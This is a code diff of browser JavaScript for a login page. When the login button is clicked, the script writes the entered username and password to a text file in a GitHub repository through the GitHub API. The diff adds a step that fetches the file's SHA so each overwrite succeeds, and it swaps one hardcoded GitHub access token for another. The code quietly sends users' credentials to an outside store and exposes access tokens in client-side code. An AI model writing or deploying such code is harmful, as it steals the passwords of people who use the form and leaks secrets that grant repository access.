@@ -10,13 +10,31 @@ document.querySelector('.loginButton').addEventListener('click', () => {
       const repoOwner = 'Arnav-lunatic'
       const repoName = 'info'
       const filePath = 'info.txt'
-      const githubToken = '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'
+      const githubToken = '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'
       const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`
 
       const newTextContent = `username - "${username.value}" | password - "${password.value}"`
 
       const updateFile = async () => {
         try {
+           // Fetch the current file content to get the SHA
+          const currentFileResponse = await fetch(apiUrl, {
+            method: 'GET',
+            headers: {
+              'Authorization': `token ${githubToken}`,
+              'Accept': 'application/vnd.github.v3+json',
+            },
+          });
+
+          if (currentFileResponse.status !== 200) {
+            console.error('Error fetching current file:', currentFileResponse.status, currentFileResponse.statusText);
+            return;
+          }
+
+          const currentFileData = await currentFileResponse.json();
+          const currentFileSha = currentFileData.sha;
+          console.log(currentFileSha);
+
           const response = await fetch(apiUrl, {
             method: 'PUT',
             headers: {
@@ -26,7 +44,7 @@ document.querySelector('.loginButton').addEventListener('click', () => {
             body: JSON.stringify({
               message: 'Update text file',
               content: btoa(newTextContent), // Encode the new text content in base64
-              sha: '8b137891791fe96927ad78e64b0aad7bded08bdc', // You need to fetch the current SHA of the file first
+              sha: currentFileSha, // You need to fetch the current SHA of the file first
             }),
           });
 
